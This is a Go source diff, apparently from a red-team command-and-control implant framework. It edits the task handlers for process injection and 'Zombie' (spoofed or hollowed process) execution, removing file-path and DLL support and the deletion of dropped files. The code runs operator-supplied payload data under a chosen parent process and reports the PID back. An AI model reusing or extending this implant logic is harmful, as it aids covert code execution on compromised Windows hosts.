@@ -74,7 +74,7 @@ func taskInject(x context.Context, r data.Reader, w data.Writer) error {
 	return nil
 }
 func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
-	z, f, v, err := ZombieUnmarshal(x, r)
+	z, f, err := ZombieUnmarshal(x, r)
 	if err != nil {
 		return err
 	}
@@ -83,29 +83,16 @@ func taskZombie(x context.Context, r data.Reader, w data.Writer) error {
 		z.Stdout, z.Stderr = w, w
 	}
 	if err = z.Start(); err != nil {
-		if z.Stdout, z.Stderr = nil, nil; v {
-			os.Remove(z.Path)
-		}
+		z.Stdout, z.Stderr = nil, nil
 		return err
 	}
 	if z.Stdin = nil; !f {
-		if w.WriteUint64(uint64(z.Pid()) << 32); v {
-			go func() {
-				if bugtrack.Enabled {
-					defer bugtrack.Recover("task.taskZombie.func1()")
-				}
-				z.Wait()
-				os.Remove(z.Path)
-			}()
-		} else {
-			z.Release()
-		}
+		w.WriteUint64(uint64(z.Pid()) << 32)
+		z.Release()
 		return nil
 	}
 	i := z.Pid()
-	if err = z.Wait(); v {
-		os.Remove(z.Path)
-	}
+	err = z.Wait()
 	z.Stdout, z.Stderr = nil, nil
 	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
 		return err
@@ -268,18 +255,17 @@ func DLLUnmarshal(x context.Context, r data.Reader) (*cmd.DLL, bool, bool, error
 }
 
 // ZombieUnmarshal will read this Zombies's struct data from the supplied reader
-// and returns a Zombie runnable struct along with the wait and delete status
-// booleans.
+// and returns a Zombie runnable struct along with the wait status boolean.
 //
 // This function returns an error if building or reading fails or if the device
 // is not running Windows.
-func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, bool, error) {
+func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, error) {
 	var z Zombie
 	if err := z.UnmarshalStream(r); err != nil {
-		return nil, false, false, err
+		return nil, false, err
 	}
-	if len(z.Args) == 0 || (len(z.Path) == 0 && len(z.Data) == 0) {
-		return nil, false, false, cmd.ErrEmptyCommand
+	if len(z.Args) == 0 || len(z.Data) == 0 {
+		return nil, false, cmd.ErrEmptyCommand
 	}
 	v := cmd.NewZombieContext(x, nil, z.Args...)
 	if len(z.Args[0]) == 7 && z.Args[0][0] == '@' && z.Args[0][6] == '@' && z.Args[0][1] == 'S' && z.Args[0][5] == 'L' {
@@ -294,15 +280,10 @@ func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, bool,
 	if v.SetParent(z.Filter); len(z.Stdin) > 0 {
 		v.Stdin = bytes.NewReader(z.Stdin)
 	}
-	if v.Timeout, v.Dir, v.Env = z.Timeout, z.Dir, z.Env; !z.IsDLL {
-		if len(v.Data) > 0 {
-			v.Data = z.Data
-		} else {
-			v.Path = z.Path
-		}
-		return v, z.Wait, false, nil
-	}
-	if len(z.Data) == 0 {
+	v.Timeout, v.Dir, v.Env, v.Data = z.Timeout, z.Dir, z.Env, z.Data
+	return v, z.Wait, nil
+	// NOTE(dij): Removing ZombieDLL code for now.
+	/*if len(z.Data) == 0 {
 		// NOTE(dij): Sanity check, shouldn't happen here.
 		return nil, false, false, cmd.ErrEmptyCommand
 	}
@@ -316,5 +297,5 @@ func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, bool,
 		return nil, false, false, err
 	}
 	v.Path = f.Name()
-	return v, z.Wait, true, nil
+	return v, z.Wait, true, nil*/
 }
